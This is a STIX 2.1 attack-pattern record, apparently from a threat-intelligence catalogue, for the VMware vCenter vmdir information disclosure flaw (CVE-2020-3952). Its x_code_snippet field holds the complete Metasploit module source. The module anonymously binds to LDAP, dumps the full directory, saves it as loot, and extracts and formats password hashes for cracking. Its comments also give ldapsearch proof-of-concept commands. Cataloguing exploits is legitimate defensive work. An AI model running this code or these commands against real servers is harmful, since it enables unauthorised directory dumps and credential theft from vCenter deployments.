{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b812ce24-dd47-4e4a-be38-6643a2fb596b",
    "created": "2024-08-14T16:31:32.062055Z",
    "modified": "2024-08-14T16:31:32.06206Z",
    "name": "VMware vCenter Server vmdir Information Disclosure",
    "description": " This module uses an anonymous-bind LDAP connection to dump data from the vmdir service in VMware vCenter Server version 6.7 prior to the 6.7U3f update, only if upgraded from a previous release line, such as 6.0 or 6.5. If the bind username and password are provided (BIND_DN and BIND_PW options), these credentials will be used instead of attempting an anonymous bind. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/vmware_vcenter_vmdir_ldap.rb",
            "external_id": "vmware_vcenter_vmdir_ldap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-3952"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2020-0006.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::LDAP\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware vCenter Server vmdir Information Disclosure',\n        'Description' => %q{\n          This module uses an anonymous-bind LDAP connection to dump data from\n          the vmdir service in VMware vCenter Server version 6.7 prior to the\n          6.7U3f update, only if upgraded from a previous release line, such as\n          6.0 or 6.5.\n          If the bind username and password are provided (BIND_DN and BIND_PW\n          options), these credentials will be used instead of attempting an\n          anonymous bind.\n        },\n        'Author' => [\n          'Hynek Petrak', # Discovery, hash dumping\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-3952'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']\n        ],\n        'DisclosureDate' => '2020-04-09', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          ['Dump', { 'Description' => 'Dump all LDAP data' }]\n        ],\n        'DefaultAction' => 'Dump',\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(636), # SSL/TLS\n      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it'])\n    ])\n  end\n\n  def base_dn\n    @base_dn ||= 'dc=vsphere,dc=local'\n  end\n\n  def policy_dn\n    \"cn=password and lockout policy,#{base_dn}\"\n  end\n\n  # PoC using ldapsearch(1):\n  #\n  # Retrieve root DSE with base DN:\n  #   ldapsearch -xb \"\" -s base -H ldap://[redacted]\n  #\n  # Dump data using discovered base DN:\n  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted] \\* + -\n  def run\n    entries = nil\n\n    ldap_connect do |ldap|\n      if (@base_dn = datastore['BASE_DN'])\n        print_status(\"User-specified base DN: #{base_dn}\")\n      else\n        print_status('Discovering base DN automatically')\n\n        unless (@base_dn = discover_base_dn(ldap))\n          print_warning('Falling back on default base DN dc=vsphere,dc=local')\n        end\n      end\n\n      print_status(\"Dumping LDAP data from vmdir service at #{peer}\")\n\n      # A \"-\" meta-attribute will dump userPassword (hat tip Hynek)\n      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/ldap-head/result.c#L647-L654\n      entries = ldap.search(base: base_dn, attributes: %w[* + -])\n    end\n\n    # Look for an entry with a non-empty vmwSTSPrivateKey attribute\n    unless entries&.find { |entry| entry[:vmwstsprivatekey].any? }\n      print_error(\"#{peer} is NOT vulnerable to CVE-2020-3952\") unless datastore['BIND_PW'].present?\n      print_error('Dump failed')\n      return Exploit::CheckCode::Safe\n    end\n\n    print_good(\"#{peer} is vulnerable to CVE-2020-3952\") unless datastore['BIND_PW'].present?\n    pillage(entries)\n\n    # HACK: Stash discovered base DN in CheckCode reason\n    Exploit::CheckCode::Vulnerable(base_dn)\n  rescue Net::LDAP::Error => e\n    print_error(\"#{e.class}: #{e.message}\")\n    Exploit::CheckCode::Unknown\n  end\n\n  def pillage(entries)\n    # TODO: Make this more efficient?\n    ldif = entries.map(&:to_ldif).map { |s| s.force_encoding('utf-8') }.join(\"\\n\")\n\n    print_status('Storing LDAP data in loot')\n\n    ldif_filename = store_loot(\n      name, # ltype\n      'text/plain', # ctype\n      rhost, # host\n      ldif, # data\n      nil, # filename\n      \"Base DN: #{base_dn}\" # info\n    )\n\n    unless ldif_filename\n      print_error('Could not store LDAP data in loot')\n      return\n    end\n\n    print_good(\"Saved LDAP data to #{ldif_filename}\")\n\n    if (policy = entries.find { |entry| entry.dn == policy_dn })\n      print_status('Password and lockout policy:')\n      print_line(policy.to_ldif[/^vmwpassword.*/m])\n    end\n\n    # Process entries with a non-empty userPassword attribute\n    process_hashes(entries.select { |entry| entry[:userpassword].any? })\n  end\n\n  def process_hashes(entries)\n    if entries.empty?\n      print_status('No password hashes found')\n      return\n    end\n\n    service_details = {\n      workspace_id: myworkspace_id,\n      module_fullname: fullname,\n      origin_type: :service,\n      address: rhost,\n      port: rport,\n      protocol: 'tcp',\n      service_name: 'vmdir/ldap'\n    }\n\n    entries.each do |entry|\n      # This is the \"username\"\n      dn = entry.dn\n\n      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/middle-layer/password.c#L32-L76\n      type, hash, salt = entry[:userpassword].first.unpack('CH128H32')\n\n      case type\n      when 1\n        unless hash.length == 128\n          vprint_error(\"Type #{type} hash length is not 128 digits (#{dn})\")\n          next\n        end\n\n        unless salt.length == 32\n          vprint_error(\"Type #{type} salt length is not 32 digits (#{dn})\")\n          next\n        end\n\n        # https://github.com/magnumripper/JohnTheRipper/blob/2778d2e9df4aa852d0bc4bfbb7b7f3dde2935b0c/doc/DYNAMIC#L197\n        john_hash = \"$dynamic_82$#{hash}$HEX$#{salt}\"\n      else\n        vprint_error(\"Hash type #{type.inspect} is not supported yet (#{dn})\")\n        next\n      end\n\n      print_good(\"Credentials found: #{dn}:#{john_hash}\")\n\n      create_credential(service_details.merge(\n        username: dn,\n        private_data: john_hash,\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(john_hash)\n      ))\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-04-09, # Vendor advisory"
}